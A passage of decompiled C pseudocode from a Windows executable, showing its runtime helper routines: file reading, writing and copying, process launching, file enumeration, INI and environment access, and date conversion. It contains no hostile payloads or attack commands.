        if ( v2 == 92 )
          goto LABEL_5;
      }
    }
  }
  v3 = (char *)sub_402580(strlen(v0) + 1);
  strcpy(v3, v0);
  return v3;
}
// 402BB0: using guessed type CHAR Filename[260];

//----- (00402C50) --------------------------------------------------------
BOOL __cdecl sub_402C50(int a1, LPCSTR lpExistingFileName, int a3, int a4, LPCSTR lpNewFileName)
{
  return CopyFileA(lpExistingFileName, lpNewFileName, 0);
}

//----- (00402C70) --------------------------------------------------------
DWORD __cdecl sub_402C70(int a1, LPCSTR lpFileName)
{
  DWORD result; // eax
  void *v3; // esi
  DWORD FileSize; // edi

  result = (DWORD)CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x20u, 0);
  v3 = (void *)result;
  if ( result != -1 )
  {
    FileSize = GetFileSize((HANDLE)result, (LPDWORD)&lpFileName);
    CloseHandle(v3);
    if ( lpFileName == (LPCSTR)-1 )
      return -1;
    else
      return FileSize;
  }
  return result;
}

//----- (00402CC0) --------------------------------------------------------
_DWORD *__cdecl sub_402CC0(int a1, LPCSTR lpFileName)
{
  HANDLE FileA; // edi
  _DWORD *result; // eax
  DWORD FileSize; // ebx
  _DWORD *v5; // esi

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x20u, 0);
  result = 0;
  if ( FileA != (HANDLE)-1 )
  {
    FileSize = GetFileSize(FileA, (LPDWORD)&lpFileName);
    v5 = sub_402580(FileSize + 8);
    *v5 = 1;
    v5[1] = FileSize;
    ReadFile(FileA, v5 + 2, FileSize, (LPDWORD)&lpFileName, 0);
    CloseHandle(FileA);
    return v5;
  }
  return result;
}

//----- (00402D30) --------------------------------------------------------
_DWORD *__cdecl sub_402D30(int a1, int a2, int a3, int a4, signed int a5)
{
  int v5; // eax
  int v6; // eax

  if ( !a2 )
    return 0;
  v5 = *(_DWORD *)(a2 + 4);
  if ( !v5 || a5 <= 0 )
    return 0;
  v6 = v5 - a5;
  if ( v6 < 0 )
    v6 = 0;
  return sub_403E00((const void *)(a2 + v6 + 8), a5);
}

//----- (00402D60) --------------------------------------------------------
int __cdecl sub_402D60(int a1, LPCSTR lpFileName, int a3, int a4, char a5)
{
  HANDLE FileA; // edi
  int result; // eax
  int v7; // ebx
  char *v8; // esi
  int v9; // [esp+4h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h] BYREF

  FileA = CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x20u, 0);
  result = 0;
  if ( FileA != (HANDLE)-1 )
  {
    v7 = 1;
    v9 = 1;
    if ( a1 > 1 )
    {
      v8 = &a5;
      while ( WriteFile(FileA, (LPCVOID)(*(_DWORD *)v8 + 8), *(_DWORD *)(*(_DWORD *)v8 + 4), &NumberOfBytesWritten, 0) )
      {
        ++v7;
        v8 += 12;
        if ( v7 >= a1 )
          goto LABEL_8;
      }
      v9 = 0;
    }
LABEL_8:
    CloseHandle(FileA);
    return v9;
  }
  return result;
}

//----- (00402E00) --------------------------------------------------------
BOOL __cdecl sub_402E00(int a1, LPSTR lpCommandLine, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  BOOL v10; // esi
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+8h] [ebp-54h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+18h] [ebp-44h] BYREF

  StartupInfo.cb = 68;
  GetStartupInfoA(&StartupInfo);
  StartupInfo.hStdOutput = 0;
  StartupInfo.hStdError = 0;
  StartupInfo.dwFlags = 1;
  if ( a10 )
  {
    switch ( a8 )
    {
      case 1:
        StartupInfo.wShowWindow = 0;
        break;
      case 3:
        StartupInfo.wShowWindow = 2;
        break;
      case 4:
        StartupInfo.wShowWindow = 3;
        break;
      case 5:
        StartupInfo.wShowWindow = 4;
        break;
      case 6:
        StartupInfo.wShowWindow = 7;
        break;
      default:
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    StartupInfo.wShowWindow = 5;
  }
  v10 = CreateProcessA(0, lpCommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation);
  if ( v10 )
  {
    if ( a5 )
      WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
  }
  return v10;
}

//----- (00402EF0) --------------------------------------------------------
const char *__cdecl sub_402EF0(int a1, _DWORD *a2)
{
  unsigned int v2; // eax
  const char *result; // eax

  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 > 0x80000101 )
  {
    if ( v2 > 0x80000401 )
    {
      if ( v2 == -2147482367 )
        goto LABEL_12;
      if ( v2 == -2147482111 )
      {
        *a2 = 8;
        return (const char *)a1;
      }
    }
    else
    {
      switch ( v2 )
      {
        case 0x80000401:
LABEL_14:
          result = (const char *)a1;
          *a2 = 8;
          return result;
        case 0x80000201:
          *a2 = 2;
          return (const char *)a1;
        case 0x80000301:
LABEL_12:
          result = (const char *)a1;
          *a2 = 4;
          return result;
      }
    }
    return 0;
  }
  if ( v2 == -2147483391 )
  {
    *a2 = 1;
    return (const char *)a1;
  }
  else
  {
    switch ( v2 )
    {
      case 0x80000002:
      case 0x80000006:
        *a2 = 4;
        result = (const char *)a1;
        break;
      case 0x80000003:
        goto LABEL_14;
      case 0x80000004:
        *a2 = strlen(*(const char **)a1) + 1;
        result = *(const char **)a1;
        break;
      case 0x80000005:
        result = (const char *)(*(_DWORD *)a1 + 8);
        *a2 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        break;
      default:
        return 0;
    }
  }
  return result;
}

//----- (00402FD0) --------------------------------------------------------
_DWORD *__cdecl sub_402FD0(int a1, int *a2, int a3, unsigned int a4)
{
  unsigned int v4; // esi
  int v5; // eax
  int *v6; // eax
  const char *v8; // eax
  unsigned int v9; // [esp+4h] [ebp-8h] BYREF
  unsigned int v10; // [esp+8h] [ebp-4h] BYREF

  v4 = a4 & 0xDFFFFFFF;
  v5 = (a4 >> 29) & 1;
  if ( (a4 & 0xDFFFFFFF) == -2147483391 )
  {
    if ( v5 == 1 )
    {
      v6 = sub_403C00(a2, (int *)&v10);
      v9 = v10;
      return sub_403E00(v6, v10);
    }
  }
  else if ( v5 == 1 )
  {
    return 0;
  }
  if ( sub_403E40(a4 & 0xDFFFFFFF) != 1 )
    return 0;
  if ( v4 == -2147483644 )
    return sub_403E00(a2, strlen((const char *)a2));
  v8 = sub_402EF0((int)&a2, &v9);
  return sub_403E00(v8, v9);
}

//----- (00403090) --------------------------------------------------------
BOOL sub_403090()
{
  BOOL result; // eax
  struct tagMSG Msg; // [esp+10h] [ebp-1Ch] BYREF

  for ( result = PeekMessageA(&Msg, 0, 0, 0, 0); result; result = PeekMessageA(&Msg, 0, 0, 0, 0) )
  {
    if ( Msg.message == 18 )
      break;
    GetMessageA(&Msg, 0, 0, 0);
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return result;
}

//----- (00403100) --------------------------------------------------------
char *__cdecl sub_403100(int a1, const char *a2, int a3, int a4, int a5)
{
  unsigned int v5; // kr04_4
  int v6; // eax
  const char *v7; // esi
  char *v8; // edx

  v5 = strlen(a2) + 1;
  if ( v5 == 1 || a5 <= 0 )
    return 0;
  v6 = v5 - 1 - a5;
  if ( v6 < 0 )
    v6 = 0;
  v7 = &a2[v6];
  v8 = (char *)sub_402580(strlen(&a2[v6]) + 1);
  strcpy(v8, v7);
  return v8;
}

//----- (00403170) --------------------------------------------------------
BOOL __cdecl sub_403170(LPCSTR lpFileName, int a2, int a3, HANDLE *a4)
{
  HANDLE FirstFileA; // esi
  BOOL result; // eax
  char *v6; // edx
  int v7; // [esp+10h] [ebp-144h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+14h] [ebp-140h] BYREF

  FirstFileA = *a4;
  v7 = 0;
  if ( lpFileName && strlen(lpFileName) )
  {
    if ( FirstFileA && FirstFileA != (HANDLE)-1 )
      FindClose(FirstFileA);
    FirstFileA = FindFirstFileA(lpFileName, &FindFileData);
    *a4 = FirstFileA;
    if ( FirstFileA == (HANDLE)-1 )
      return 0;
    if ( a3 )
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 16 )
        goto LABEL_11;
    }
    else if ( (FindFileData.dwFileAttributes & a2) != 0 )
    {
LABEL_11:
      v7 = 1;
    }
  }
  if ( !FirstFileA || FirstFileA == (HANDLE)-1 )
    return 0;
  if ( !v7 )
  {
    if ( a3 )
    {
      if ( FindNextFileA(FirstFileA, &FindFileData) )
      {
        while ( (FindFileData.dwFileAttributes & 0x10) == 16 )
        {
          if ( !FindNextFileA(FirstFileA, &FindFileData) )
            return 0;
        }
        goto LABEL_24;
      }
    }
    else if ( FindNextFileA(FirstFileA, &FindFileData) )
    {
      while ( (a2 & FindFileData.dwFileAttributes) == 0 )
      {
        result = FindNextFileA(FirstFileA, &FindFileData);
        if ( !result )
          return result;
      }
      goto LABEL_24;
    }
    return 0;
  }
LABEL_24:
  v6 = (char *)sub_402580(strlen(FindFileData.cFileName) + 1);
  strcpy(v6, FindFileData.cFileName);
  return (BOOL)v6;
}

//----- (004032C0) --------------------------------------------------------
HANDLE __cdecl sub_4032C0(HANDLE hFindFile)
{
  HANDLE result; // eax

  result = hFindFile;
  if ( hFindFile )
  {
    if ( hFindFile != (HANDLE)-1 )
      return (HANDLE)FindClose(hFindFile);
  }
  return result;
}

//----- (004032E0) --------------------------------------------------------
CHAR *__cdecl sub_4032E0(int a1, LPCSTR lpName)
{
  CHAR *v2; // edi
  DWORD EnvironmentVariableA; // esi
  DWORD v4; // ebx

  v2 = (CHAR *)sub_402580(0x104u);
  EnvironmentVariableA = GetEnvironmentVariableA(lpName, v2, 0x104u);
  if ( EnvironmentVariableA <= 0x104 )
    return v2;
  do
  {
    sub_402610(v2);
    v4 = EnvironmentVariableA;
    v2 = (CHAR *)sub_402580(EnvironmentVariableA);
    EnvironmentVariableA = GetEnvironmentVariableA(lpName, v2, EnvironmentVariableA);
  }
  while ( EnvironmentVariableA > v4 );
  return v2;
}

//----- (00403340) --------------------------------------------------------
void *__cdecl sub_403340(
        int a1,
        LPCSTR lpFileName,
        int a3,
        int a4,
        LPCSTR lpAppName,
        int a6,
        int a7,
        LPCSTR lpKeyName,
        int a9,
        int a10,
        LPCSTR lpDefault)
{
  CHAR *v11; // esi
  signed int PrivateProfileStringA; // eax
  size_t v13; // edi
  void *v14; // ebx
  unsigned int v15; // kr04_4

  v11 = (CHAR *)sub_4179F3(0x400u);
  PrivateProfileStringA = GetPrivateProfileStringA(lpAppName, lpKeyName, lpDefault, v11, 0x400u, lpFileName);
  if ( PrivateProfileStringA >= 1023 )
  {
    do
    {
      v13 = PrivateProfileStringA + 1024;
      sub_417A1C(v11);
      v11 = (CHAR *)sub_4179F3(v13);
      PrivateProfileStringA = GetPrivateProfileStringA(lpAppName, lpKeyName, lpDefault, v11, v13, lpFileName);
    }
    while ( PrivateProfileStringA >= (int)(v13 - 1) );
  }
  v14 = 0;
  v15 = strlen(v11) + 1;
  if ( v15 != 1 )
    v14 = sub_403E70(v11, v15 - 1);
  sub_417A1C(v11);
  return v14;
}

//----- (004033E0) --------------------------------------------------------
_DWORD *__cdecl sub_4033E0(int a1, LPCSTR lpFileName, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  DWORD v10; // ecx
  DWORD v11; // edx
  DWORD v12; // eax
  HANDLE FileA; // edi
  _DWORD *v14; // esi

  if ( a7 )
  {
    switch ( a5 )
    {
      case 1:
        v10 = 0x80000000;
        goto LABEL_9;
      case 2:
        v10 = 0x40000000;
        goto LABEL_9;
      case 4:
        v10 = 0x40000000;
        v11 = 2;
        break;
      case 5:
        v10 = 0x40000000;
        v11 = 4;
        break;
      case 6:
        v10 = -1073741824;
        v11 = 4;
        break;
      default:
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    v10 = -1073741824;
LABEL_9:
    v11 = 3;
  }
  if ( a10 )
  {
    v12 = a8;
    if ( a8 != 2 )
    {
      if ( a8 == 3 )
        v12 = 1;
      else
        v12 = a8 != 4 ? 3 : 0;
    }
  }
  else
  {
    v12 = 3;
  }
  FileA = CreateFileA(lpFileName, v10, v12, 0, v11, 0x20u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  v14 = sub_4179F3(0xCu);
  *v14 = 1;
  v14[1] = FileA;
  sub_403FA0(v14);
  return v14;
}

//----- (004034C0) --------------------------------------------------------
int __cdecl sub_4034C0(int a1, _DWORD *a2, int a3, int a4, char a5)
{
  int result; // eax
  int v6; // ebx
  void *v7; // edi
  char *i; // esi
  int v9; // esi
  char *v10; // edi
  int v11; // ebx
  int v12; // [esp+8h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF

  if ( !a2 )
    return 0;
  result = sub_403FD0(a2);
  if ( result )
  {
    v6 = 1;
    v12 = 0;
    if ( *a2 == 1 )
    {
      v7 = (void *)a2[1];
      v12 = 1;
      if ( a1 > 1 )
      {
        for ( i = &a5;
              WriteFile(v7, (LPCVOID)(*(_DWORD *)i + 8), *(_DWORD *)(*(_DWORD *)i + 4), &NumberOfBytesWritten, 0);
              i += 12 )
        {
          if ( ++v6 >= a1 )
            return 1;
        }
        return 0;
      }
    }
    else if ( *a2 == 2 )
    {
      v9 = a2[1];
      v12 = 1;
      if ( a1 > 1 )
      {
        v10 = &a5;
        v11 = a1 - 1;
        do
        {
          (*(void (__thiscall **)(int, int, _DWORD))(*(_DWORD *)v9 + 36))(
            v9,
            *(_DWORD *)v10 + 8,
            *(_DWORD *)(*(_DWORD *)v10 + 4));
          v10 += 12;
          --v11;
        }
        while ( v11 );
      }
    }
    return v12;
  }
  return result;
}

//----- (004035A0) --------------------------------------------------------
BOOL __cdecl sub_4035A0(
        int a1,
        LPCSTR lpFileName,
        int a3,
        int a4,
        LPCSTR lpAppName,
        int a6,
        int a7,
        LPCSTR lpKeyName,
        int a9,
        int a10,
        LPCSTR lpString)
{
  return WritePrivateProfileStringA(lpAppName, lpKeyName, lpString, lpFileName);
}

//----- (004035C0) --------------------------------------------------------
void __cdecl sub_4035C0(int a1, HANDLE *a2)
{
  if ( a2 )
    sub_403F20(a2);
}

//----- (004035D0) --------------------------------------------------------
int __cdecl sub_4035D0(
        int a1,
        const char *a2,
        int a3,
        int a4,
        char *Str2,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11)
{
  unsigned int v11; // kr04_4
  signed int v12; // edx
  unsigned int v13; // kr08_4
  signed int v14; // ecx
  size_t v15; // edi
  int v16; // eax
  int v17; // edx
  const char *v18; // esi
  const char *v19; // ebx

  v11 = strlen(a2) + 1;
  v12 = v11 - 1;
  v13 = strlen(Str2) + 1;
  v14 = v13 - 1;
  v15 = v13 - 1;
  if ( v11 == 1 || v13 == 1 || v14 > v12 )
    return -1;
  if ( !a10 || (v16 = a8, a8 <= 0) )
    v16 = 1;
  v17 = v12 - v14;
  if ( v16 > v17 + 1 )
    return -1;
  v18 = &a2[v16 - 1];
  v19 = &a2[v17];
  if ( !a11 )
  {
    if ( v18 <= v19 )
    {
      while ( strncmp(v18, Str2, v15) )
      {
        if ( *v18 >= 0 )
          ++v18;
        else
          v18 += 2;
        if ( v18 > v19 )
          return -1;
      }
      return v18 - a2 + 1;
    }
    return -1;
  }
  if ( v18 > v19 )
    return -1;
  while ( _strnicmp(v18, Str2, v15) )
  {
    if ( *v18 >= 0 )
      ++v18;
    else
      v18 += 2;
    if ( v18 > v19 )
      return -1;
  }
  return v18 - a2 + 1;
}

//----- (004036A0) --------------------------------------------------------
int __stdcall sub_4036A0(int a1, _DWORD *lpMem, int *dwBytes)
{
  __int64 v3; // rax
  char *v4; // eax
  LPSTR CommandLineA; // eax
  CHAR v6; // dl
  _BYTE *v7; // eax
  char v8; // cl
  struct tagMSG Msg; // [esp+10h] [ebp-51Ch] BYREF
  CHAR v11[256]; // [esp+2Ch] [ebp-500h] BYREF
  CHAR Text[1024]; // [esp+12Ch] [ebp-400h] BYREF

  if ( a1 > 2023 )
  {
    switch ( a1 )
    {
      case 2024:
        LODWORD(v3) = sub_402580((SIZE_T)lpMem);
        break;
      case 2025:
        sub_402610(lpMem);
        LODWORD(v3) = 0;
        break;
      case 2026:
        LODWORD(v3) = sub_4025D0(lpMem, (SIZE_T)dwBytes);
        break;
      case 2027:
        wsprintfA(Text, "BlackMoon RunTime Error:\r\n\r\n%s", (const char *)lpMem);
        MessageBoxA(0, Text, aError_0, 0x10u);
        sub_4024F0();
        LODWORD(v3) = 0;
        break;
      case 2028:
        sub_4024F0();
        LODWORD(v3) = 0;
        break;
      case 2030:
        LODWORD(v3) = 3;
        break;
      case 2032:
      case 2033:
        goto LABEL_67;
      default:
        goto LABEL_66;
    }
  }
  else
  {
    if ( a1 == 2023 )
    {
      if ( (unsigned int)lpMem > 0x80000201 )
      {
        if ( (unsigned int)lpMem > 0x80000501 )
        {
          if ( lpMem != (_DWORD *)-2147482111 )
            goto LABEL_67;
        }
        else if ( lpMem != (_DWORD *)-2147482367 && lpMem != (_DWORD *)-2147482879 && lpMem != (_DWORD *)-2147482623 )
        {
          LODWORD(v3) = 0;
          return v3;
        }
      }
      else if ( lpMem != (_DWORD *)-2147483135 )
      {
        if ( (unsigned int)lpMem > 0x80000006 )
        {
          if ( lpMem != (_DWORD *)-2147483391 )
          {
            LODWORD(v3) = 0;
            return v3;
          }
        }
        else if ( lpMem != (_DWORD *)-2147483642 )
        {
          switch ( (unsigned int)lpMem )
          {
            case 0x80000002:
            case 0x80000003:
              goto LABEL_58;
            case 0x80000004:
            case 0x80000005:
              sub_404000(dwBytes);
              LODWORD(v3) = 0;
              break;
            default:
              goto LABEL_67;
          }
          return v3;
        }
      }
LABEL_58:
      sub_402610(dwBytes);
      LODWORD(v3) = 0;
      return v3;
    }
    if ( a1 > 2002 )
    {
      switch ( a1 )
      {
        case 2003:
          if ( GetModuleFileNameA(0, Str, 0x104u) )
          {
            *strrchr(Str, 92) = 0;
            LODWORD(v3) = Str;
            return v3;
          }
          break;
        case 2004:
          if ( GetModuleFileNameA(0, Str, 0x104u) )
          {
            LODWORD(v3) = strrchr(Str, 92) + 1;
            *(_BYTE *)v3 = 0;
            LODWORD(v3) = v3 + 1;
            return v3;
          }
          break;
        case 2018:
          if ( PeekMessageA(&Msg, 0, 0, 0, 0) )
          {
            while ( Msg.message != 18 )
            {
              GetMessageA(&Msg, 0, 0, 0);
              TranslateMessage(&Msg);
              DispatchMessageA(&Msg);
              LODWORD(v3) = PeekMessageA(&Msg, 0, 0, 0, 0);
              if ( !(_DWORD)v3 )
                return v3;
            }
          }
          goto LABEL_67;
        default:
          goto LABEL_66;
      }
      goto LABEL_67;
    }
    if ( a1 == 2002 )
    {
      CommandLineA = GetCommandLineA();
      v6 = *CommandLineA;
      v7 = CommandLineA + 1;
      v8 = 32;
      if ( v6 == 34 )
        v8 = 34;
      BYTE4(v3) = *v7;
      for ( LODWORD(v3) = v7 + 1; BYTE4(v3) != v8; LODWORD(v3) = v3 + 1 )
        BYTE4(v3) = *(_BYTE *)v3;
      if ( v8 != 32 && *(_BYTE *)v3 == 32 )
        LODWORD(v3) = v3 + 1;
    }
    else
    {
      if ( a1 <= 1006 )
      {
        if ( a1 != 1006 )
        {
          if ( a1 == 1004 )
          {
            LODWORD(v3) = 1;
            return v3;
          }
          if ( a1 == 1005 )
          {
            LODWORD(v3) = 4;
            return v3;
          }
          goto LABEL_66;
        }
        if ( GetModuleFileNameA(0, Str, 0x104u) )
        {
          v4 = strrchr(Str, 92) + 1;
          *v4 = 0;
          strcpy(&byte_42AD44, v4 + 1);
        }
        else
        {
          Str[0] = 0;
          byte_42AD44 = 0;
        }
        if ( lpMem == (_DWORD *)1 )
        {
          LODWORD(v3) = Str;
          strcpy((char *)dwBytes, Str);
          return v3;
        }
        if ( lpMem == (_DWORD *)2001 )
        {
          strcpy((char *)dwBytes, Str);
          LODWORD(v3) = Str;
          return v3;
        }
        if ( lpMem == (_DWORD *)2002 )
        {
          LODWORD(v3) = &byte_42AD44;
          strcpy((char *)dwBytes, &byte_42AD44);
          return v3;
        }
LABEL_67:
        LODWORD(v3) = 0;
        return v3;
      }
      if ( a1 != 2001 )
      {
LABEL_66:
        wsprintfA(v11, "%d. ", a1);
        MessageBoxA(0, v11, aBlackmoon, 0x10u);
        goto LABEL_67;
      }
      HIDWORD(v3) = lpMem[2];
      LODWORD(v3) = *lpMem;
      if ( HIDWORD(v3) != -2147482623 )
      {
        if ( HIDWORD(v3) == -2147482367 )
        {
          return (__int64)*(float *)lpMem;
        }
        else if ( HIDWORD(v3) == -2147482111 )
        {
          return (__int64)*(double *)lpMem;
        }
      }
    }
  }
  return v3;
}
// 42AD44: using guessed type char byte_42AD44;

//----- (00403C00) --------------------------------------------------------
int *__cdecl sub_403C00(int *a1, int *a2)
{
  int v2; // ecx
  int v3; // edx
  int *result; // eax
  int v5; // esi

  v2 = 1;
  v3 = *a1;
  result = a1 + 1;
  if ( *a1 <= 0 )
  {
    *a2 = 1;
  }
  else
  {
    do
    {
      v5 = *result++;
      v2 *= v5;
      --v3;
    }
    while ( v3 );
    *a2 = v2;
  }
  return result;
}

//----- (00403C30) --------------------------------------------------------
const char *__cdecl sub_403C30(const char *a1)
{
  const char *result; // eax
  char v2; // cl

  result = &a1[strlen(a1) - 1];
  v2 = *result;
  if ( *result == 46 )
  {
LABEL_5:
    *result = 0;
  }
  else
  {
    while ( v2 == 48 )
    {
      if ( result <= a1 )
        return result;
      v2 = *--result;
      if ( v2 == 46 )
        goto LABEL_5;
    }
    *((_BYTE *)result + 1) = 0;
  }
  return result;
}

//----- (00403C70) --------------------------------------------------------
int __cdecl sub_403C70(char *Buffer, double X, int a3)
{
  int v3; // edx
  int v5; // [esp+10h] [ebp-128h] BYREF
  int v6; // [esp+14h] [ebp-124h] BYREF
  int v7; // [esp+18h] [ebp-120h] BYREF
  int v8; // [esp+1Ch] [ebp-11Ch] BYREF
  int v9; // [esp+20h] [ebp-118h] BYREF
  int v10; // [esp+24h] [ebp-114h] BYREF
  double v11; // [esp+28h] [ebp-110h]
  double Y; // [esp+30h] [ebp-108h] BYREF
  char v13[128]; // [esp+38h] [ebp-100h] BYREF
  char Format[128]; // [esp+B8h] [ebp-80h] BYREF

  v11 = modf(X, &Y);
  sub_4041E0(v11, &v6, &v5, &v8);
  sub_404060(Y, &v10, &v7, &v9);
  v3 = v8;
  strcpy(Format, aDDD);
  if ( v3 )
  {
    strcpy(v13, aDDD_0);
  }
  else if ( v5 )
  {
    strcpy(v13, aDD);
  }
  else if ( v6 )
  {
    strcpy(v13, aD);
  }
  else
  {
    v13[0] = 0;
  }
  if ( !a3 )
    strcat(Format, v13);
  return sprintf(Buffer, Format, v10, v7, v9, v6, v5, v3);
}

//----- (00403E00) --------------------------------------------------------
_DWORD *__cdecl sub_403E00(const void *a1, unsigned int a2)
{
  _DWORD *result; // eax

  if ( !a2 )
    return 0;
  result = sub_402580(a2 + 8);
  result[1] = a2;
  *result = 1;
  qmemcpy(result + 2, a1, a2);
  return result;
}

//----- (00403E40) --------------------------------------------------------
int __cdecl sub_403E40(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
  {
    if ( (a1 & 0xC0000000) == 0x80000000 )
      return 1;
    else
      return ((a1 & 0xC0000000) != 0x40000000) + 2;
  }
  return result;
}

//----- (00403E70) --------------------------------------------------------
void *__cdecl sub_403E70(const void *a1, signed int a2)
{
  void *result; // eax

  if ( a2 <= 0 )
    return 0;
  result = sub_402580(a2 + 1);
  qmemcpy(result, a1, a2);
  *((_BYTE *)result + a2) = 0;
  return result;
}

//----- (00403EB0) --------------------------------------------------------
void sub_403EB0()
{
  LPVOID v0; // esi
  bool v1; // zf
  int v2; // ecx
  _DWORD *v3; // eax

  v0 = dword_42AF4C;
  v1 = dword_42AF4C == 0;
  dword_42AF4C = 0;
  dword_42AD34 = 0;
  if ( !v1 )
  {
    do
    {
      v2 = *((_DWORD *)v0 + 1);
      if ( v2 )
      {
        if ( *(_DWORD *)v0 == 1 )
        {
          CloseHandle(*((HANDLE *)v0 + 1));
        }
        else if ( *(_DWORD *)v0 == 2 )
        {
          (*(void (__thiscall **)(int, int))(*(_DWORD *)v2 + 16))(v2, 1);
        }
      }
      v3 = v0;
      v0 = (LPVOID)*((_DWORD *)v0 + 2);
      *v3 = 0;
      v3[1] = 0;
      v3[2] = 0;
      sub_417A1C(v3);
    }
    while ( v0 );
  }
}
// 403EF0: conditional instruction was optimized away because ecx.4!=0
// 42AD34: using guessed type int (*dword_42AD34)(void);

//----- (00403F20) --------------------------------------------------------
void __cdecl sub_403F20(HANDLE *a1)
{
  HANDLE *v1; // esi
  HANDLE *v2; // eax
  HANDLE v3; // ecx

  v1 = (HANDLE *)dword_42AF4C;
  v2 = 0;
  if ( dword_42AF4C )
  {
    while ( v1 != a1 )
    {
      v2 = v1;
      v1 = (HANDLE *)v1[2];
      if ( !v1 )
        return;
    }
    if ( v2 )
    {
      v2[2] = v1[2];
    }
    else
    {
      dword_42AF4C = v1[2];
      if ( !dword_42AF4C )
        dword_42AD34 = 0;
    }
    v3 = v1[1];
    if ( v3 )
    {
      if ( *v1 == HANDLE_FLAG_INHERIT )
      {
        CloseHandle(v1[1]);
      }
      else if ( *v1 == HANDLE_FLAG_PROTECT_FROM_CLOSE )
      {
        (*(void (__thiscall **)(HANDLE, int))(*(_DWORD *)v3 + 16))(v3, 1);
      }
    }
    *v1 = 0;
    v1[1] = 0;
    v1[2] = 0;
    sub_417A1C(v1);
  }
}
// 403F7B: conditional instruction was optimized away because ecx.4!=0
// 42AD34: using guessed type int (*dword_42AD34)(void);

//----- (00403FA0) --------------------------------------------------------
LPVOID __cdecl sub_403FA0(_DWORD *a1)
{
  LPVOID result; // eax

  result = dword_42AF4C;
  if ( !dword_42AF4C )
    dword_42AD34 = (int (*)(void))sub_403EB0;
  a1[2] = dword_42AF4C;
  dword_42AF4C = a1;
  return result;
}
// 42AD34: using guessed type int (*dword_42AD34)(void);

//----- (00403FD0) --------------------------------------------------------
int __cdecl sub_403FD0(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = dword_42AF4C;
  if ( !dword_42AF4C )
    return 0;
  while ( v1 != a1 )
  {
    v1 = (_DWORD *)v1[2];
    if ( !v1 )
      return 0;
  }
  return 1;
}

//----- (00404000) --------------------------------------------------------
void __cdecl sub_404000(int *lp)
{
  int *v1; // esi
  unsigned int i; // edi
  unsigned int v3; // [esp+Ch] [ebp-4h] BYREF

  v3 = 0;
  v1 = sub_403C00(lp, (int *)&v3);
  for ( i = 0; i < v3; ++i )
  {
    if ( *v1 )
    {
      sub_402610((void *)*v1);
      *v1 = 0;
    }
    ++v1;
  }
  sub_402610(lp);
}

//----- (00404060) --------------------------------------------------------
int __cdecl sub_404060(double a1, int *a2, _DWORD *a3, int *a4)
{
  long double v5; // st7
  unsigned __int8 v6; // c0
  unsigned __int8 v7; // c3
  int v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v11; // esi
  bool v12; // zf
  signed int v13; // ecx
  __int64 v14; // rax
  int v16; // [esp+0h] [ebp-30h] BYREF
  int v17; // [esp+4h] [ebp-2Ch]
  int v18; // [esp+8h] [ebp-28h]
  int v19; // [esp+Ch] [ebp-24h]
  int v20; // [esp+10h] [ebp-20h]
  int v21; // [esp+14h] [ebp-1Ch]
  int v22; // [esp+18h] [ebp-18h]
  int v23; // [esp+1Ch] [ebp-14h]
  int v24; // [esp+20h] [ebp-10h]
  int v25; // [esp+24h] [ebp-Ch]
  int v26; // [esp+28h] [ebp-8h]
  int v27; // [esp+2Ch] [ebp-4h]

  if ( a1 == 0.0 || a1 == 1.0 )
  {
    *a2 = 1899;
    *a3 = 12;
    v14 = (__int64)(a1 + 30.0);
    *a4 = v14;
  }
  else
  {
    v5 = a1 - 1.0;
    if ( v6 | v7 )
    {
      v8 = (__int64)fabs(v5);
      v9 = 1899;
      v10 = -1;
    }
    else
    {
      v8 = (__int64)v5;
      v9 = 1900;
      v10 = 1;
    }
    while ( 1 )
    {
      v11 = 365;
      if ( !(v9 % 400) || v9 % 100 && !(v9 % 4) )
        v11 = 366;
      if ( v8 <= v11 )
        break;
      v8 -= v11;
      v9 += v10;
    }
    *a2 = v9;
    if ( v10 == -1 )
      v8 = v11 - v8;
    v16 = 31;
    v18 = 31;
    v20 = 31;
    v22 = 31;
    v23 = 31;
    v25 = 31;
    v27 = 31;
    v19 = 30;
    v21 = 30;
    v24 = 30;
    v26 = 30;
    v17 = 28;
    if ( !(v9 % 400) )
      goto LABEL_19;
    if ( v9 % 100 )
    {
      v13 = v9 & 0x80000003;
      v12 = v13 == 0;
      if ( v13 < 0 )
        v12 = (((_BYTE)v13 - 1) | 0xFFFFFFFC) == -1;
      if ( v12 )
LABEL_19:
        v17 = 29;
    }
    LODWORD(v14) = 0;
    HIDWORD(v14) = &v16;
    while ( (unsigned int)v8 > *(_DWORD *)HIDWORD(v14) )
    {
      v8 -= *(_DWORD *)HIDWORD(v14);
      LODWORD(v14) = v14 + 1;
      HIDWORD(v14) += 4;
      if ( (int)v14 >= 12 )
        return v14;
    }
    LODWORD(v14) = v14 + 1;
    *a3 = v14;
    *a4 = v8;
  }
  return v14;
}
// 40409B: variable 'v6' is possibly undefined
// 40409B: variable 'v7' is possibly undefined

//----- (004041E0) --------------------------------------------------------
_DWORD *__cdecl sub_4041E0(double a1, int *a2, int *a3, _DWORD *a4)
{
  __int64 v4; // rax
  _DWORD *result; // eax

  v4 = (__int64)(fabs(a1) * 86400.0 + 0.5);
  *a2 = (int)v4 / 3600;
  *a3 = (int)v4 % 3600 / 60;
